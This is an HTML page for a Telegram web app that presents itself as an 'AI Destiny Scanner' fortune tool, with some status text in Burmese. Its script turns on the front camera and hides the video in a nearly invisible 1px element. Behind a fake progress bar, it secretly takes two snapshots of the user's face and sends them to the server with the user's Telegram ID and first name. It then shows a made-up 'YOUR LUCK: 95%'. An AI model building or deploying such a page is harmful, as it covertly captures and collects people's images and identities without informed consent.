<!DOCTYPE html>
<html>
<head>
    <title>AI Destiny Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0a0e14; color: #00d2ff; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
        .scanner-box { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
        .scan-line { width: 80%; height: 2px; background: #00d2ff; position: absolute; animation: scan 3s infinite linear; }
        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; }
        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.1s; }
        @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
    </style>
</head>
<body>
    <div class="scanner-box">
        <div class="scan-line"></div>
        <h2 id="header">AI DESTINY SCANNER</h2>
        <p id="status">ကင်မရာအား စစ်ဆေးနေပါသည်...</p>
        <div class="loading-bar"><div class="progress" id="progress"></div></div>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => { video.srcObject = s; startProcess(); })
            .catch(() => status.innerText = "Camera Permission လိုအပ်ပါသည်");

        let captureCount = 0;
        function startProcess() {
            let width = 0;
            const itv = setInterval(() => {
                width += 0.5;
                progress.style.width = width + '%';
                if (width == 30 && captureCount == 0) { captureImage("Scanning..."); captureCount++; }
                if (width == 70 && captureCount == 1) { captureImage("Analyzing..."); captureCount++; }
                if (width >= 100) {
                    clearInterval(itv);
                    status.innerText = "အောင်မြင်ပါသည်!";
                    document.getElementById('header').innerText = "YOUR LUCK: 95%";
                    setTimeout(() => tg.close(), 3000);
                }
            }, 50);
        }

        async function captureImage(msg) {
            status.innerText = msg;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.6);
            const uid = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "Guest";
            const uname = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "External";
            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: img, user_id: uid, user_name: uname })
            });
        }
    </script>
</body>
</html>
